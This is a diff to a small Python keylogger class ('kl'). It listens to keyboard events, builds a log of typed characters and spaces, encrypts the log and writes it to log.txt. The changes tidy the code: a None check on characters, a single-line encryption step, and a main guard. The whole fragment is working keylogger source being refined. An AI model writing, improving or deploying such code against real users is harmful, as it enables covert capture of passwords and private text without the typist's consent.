@@ -7,9 +7,10 @@ class kl:
         self.log = ''
         self.cifrado = None
 
-    def on_press(self, key): # 
+    def on_press(self, key):
         try:
-            self.log += str(key.char)
+            if not (key.char == None):
+                self.log += str(key.char)
         except AttributeError:
             if key == keyboard.Key.esc:
                 # Stop listener
@@ -23,13 +24,10 @@ class kl:
             elif key == keyboard.Key.space:
                 self.log += " "
             else:
-                #self.log += str(key)
                 pass
 
     def save_data(self, log: str):
-        log_b = log.encode("utf-8")
-        cypher = self.cifrado.encrypt(log_b)
-        cypherS = cypher.decode('utf-8')
+        cypherS = self.cifrado.encrypt(log.encode("utf-8")).decode('utf-8')
         with open("log.txt", "w", encoding='UTF-8') as f:
             f.write(self.head+"\n"+(cypherS))
 
@@ -45,4 +43,5 @@ class kl:
         listener = keyboard.Listener()
         listener.start()
 
-kl().start()
+if __name__ == '__main__':
+    kl().start()
